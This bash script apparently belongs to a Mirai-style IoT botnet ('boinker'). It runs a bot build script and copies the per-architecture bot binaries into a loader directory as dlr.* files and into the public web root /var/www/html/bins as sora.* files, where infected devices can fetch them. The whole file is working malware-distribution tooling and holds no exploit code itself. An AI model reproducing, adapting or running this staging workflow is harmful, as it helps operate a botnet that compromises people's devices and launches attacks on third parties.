#!/bin/bash

# Automated Bot Build and Distribution Script
# This script builds the bot, copies binaries to loader and web directories with proper naming

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
BOT_SOURCE_DIR="/root/boinker/bot"
BINARIES_DIR="/root/boinker/binaries"
LOADER_BINS_DIR="/root/boinker/loader/bins"
WEB_BINS_DIR="/var/www/html/bins"
BUILD_SCRIPT="/root/boinker/build_bot.sh"

echo -e "${BLUE}=== Automated Bot Build and Distribution Script ===${NC}"
echo -e "${YELLOW}Building bot binaries and distributing to loader and web directories${NC}"
echo

# Function to check if directories exist
check_directories() {
    echo -e "${BLUE}Checking directories...${NC}"
    
    if [ ! -d "$BOT_SOURCE_DIR" ]; then
        echo -e "${RED}ERROR: Bot source directory not found: $BOT_SOURCE_DIR${NC}"
        exit 1
    fi
    
    if [ ! -f "$BUILD_SCRIPT" ]; then
        echo -e "${RED}ERROR: Build script not found: $BUILD_SCRIPT${NC}"
        exit 1
    fi
    
    # Create directories if they don't exist
    mkdir -p "$BINARIES_DIR"
    mkdir -p "$LOADER_BINS_DIR"
    mkdir -p "$WEB_BINS_DIR"
    
    echo -e "${GREEN}All directories verified/created${NC}"
}

# Function to build the bot
build_bot() {
    echo -e "${BLUE}=== Building Bot Binaries ===${NC}"
    
    if [ ! -x "$BUILD_SCRIPT" ]; then
        echo -e "${YELLOW}Making build script executable...${NC}"
        chmod +x "$BUILD_SCRIPT"
    fi
    
    echo -e "${YELLOW}Running build script...${NC}"
    cd /root/boinker
    ./build_bot.sh
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Bot build completed successfully${NC}"
    else
        echo -e "${YELLOW}Build script completed with warnings (some compilers may be missing)${NC}"
    fi
}

# Function to copy binaries to loader directory
copy_to_loader() {
    echo -e "${BLUE}=== Copying Binaries to Loader Directory ===${NC}"
    
    # Ensure loader bins directory exists
    mkdir -p "$LOADER_BINS_DIR"
    
    local copied_count=0
    
    # Check if binaries directory exists and has bot files
    if [ ! -d "$BINARIES_DIR" ]; then
        echo -e "${RED}ERROR: Binaries directory not found: $BINARIES_DIR${NC}"
        return 1
    fi
    
    # Copy each bot binary
    for file in "$BINARIES_DIR"/bot.*; do
        if [ -f "$file" ]; then
            local arch=$(echo "$file" | sed 's/.*bot\.//')
            local target_file="$LOADER_BINS_DIR/dlr.$arch"
            
            echo -e "${YELLOW}Copying $file to $target_file${NC}"
            cp "$file" "$target_file"
            
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}Successfully copied $(basename "$file") to dlr.$arch${NC}"
                ((copied_count++))
            else
                echo -e "${RED}Failed to copy $(basename "$file")${NC}"
            fi
        fi
    done
    
    echo -e "${YELLOW}Copied $copied_count binaries to loader directory${NC}"
    
    # Verify the copy was successful
    if [ $copied_count -gt 0 ]; then
        echo -e "${GREEN}Loader binaries verification:${NC}"
        ls -la "$LOADER_BINS_DIR"/dlr.* 2>/dev/null || echo "No dlr.* files found"
    fi
}

# Function to copy binaries to web directory
copy_to_web() {
    echo -e "${BLUE}=== Copying Binaries to Web Directory ===${NC}"
    
    # Ensure web bins directory exists
    mkdir -p "$WEB_BINS_DIR"
    
    local copied_count=0
    
    # Check if binaries directory exists and has bot files
    if [ ! -d "$BINARIES_DIR" ]; then
        echo -e "${RED}ERROR: Binaries directory not found: $BINARIES_DIR${NC}"
        return 1
    fi
    
    # Copy each bot binary
    for file in "$BINARIES_DIR"/bot.*; do
        if [ -f "$file" ]; then
            local arch=$(echo "$file" | sed 's/.*bot\.//')
            local target_file="$WEB_BINS_DIR/sora.$arch"
            
            echo -e "${YELLOW}Copying $file to $target_file${NC}"
            cp "$file" "$target_file"
            
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}Successfully copied $(basename "$file") to sora.$arch${NC}"
                ((copied_count++))
            else
                echo -e "${RED}Failed to copy $(basename "$file")${NC}"
            fi
        fi
    done
    
    echo -e "${YELLOW}Copied $copied_count binaries to web directory${NC}"
    
    # Verify the copy was successful
    if [ $copied_count -gt 0 ]; then
        echo -e "${GREEN}Web binaries verification:${NC}"
        ls -la "$WEB_BINS_DIR"/sora.* 2>/dev/null || echo "No sora.* files found"
    fi
}

# Function to show summary
show_summary() {
    echo -e "${BLUE}=== Build and Distribution Summary ===${NC}"
    
    echo -e "${YELLOW}Source binaries in $BINARIES_DIR:${NC}"
    ls -la "$BINARIES_DIR"/bot.* 2>/dev/null | wc -l | xargs echo "Count:"
    
    echo -e "${YELLOW}Loader binaries in $LOADER_BINS_DIR:${NC}"
    ls -la "$LOADER_BINS_DIR"/dlr.* 2>/dev/null | wc -l | xargs echo "Count:"
    
    echo -e "${YELLOW}Web binaries in $WEB_BINS_DIR:${NC}"
    ls -la "$WEB_BINS_DIR"/sora.* 2>/dev/null | wc -l | xargs echo "Count:"
    
    echo
    echo -e "${GREEN}=== File Locations ===${NC}"
    echo -e "${YELLOW}Loader binaries (dlr.*): $LOADER_BINS_DIR${NC}"
    echo -e "${YELLOW}Web binaries (sora.*): $WEB_BINS_DIR${NC}"
    echo -e "${YELLOW}Source binaries (bot.*): $BINARIES_DIR${NC}"
}

# Function to clean old binaries (optional)
clean_old_binaries() {
    echo -e "${BLUE}=== Cleaning Old Binaries ===${NC}"
    
    # Clean loader binaries
    if [ -d "$LOADER_BINS_DIR" ]; then
        rm -f "$LOADER_BINS_DIR"/dlr.*
        echo -e "${YELLOW}Cleaned old loader binaries${NC}"
    fi
    
    # Clean web binaries
    if [ -d "$WEB_BINS_DIR" ]; then
        rm -f "$WEB_BINS_DIR"/sora.*
        echo -e "${YELLOW}Cleaned old web binaries${NC}"
    fi
}

# Main execution
main() {
    echo -e "${BLUE}Starting automated build and distribution process...${NC}"
    echo
    
    # Check if clean flag is provided
    if [ "$1" = "--clean" ]; then
        clean_old_binaries
        echo
    fi
    
    # Execute steps
    check_directories
    echo
    
    build_bot
    echo
    
    copy_to_loader
    echo
    
    copy_to_web
    echo
    
    show_summary
    echo
    
    echo -e "${GREEN}=== Automated Build and Distribution Completed Successfully! ===${NC}"
    echo -e "${YELLOW}Usage: $0 [--clean]${NC}"
    echo -e "${YELLOW}  --clean: Remove old binaries before building new ones${NC}"
}

# Run main function with all arguments
main "$@"
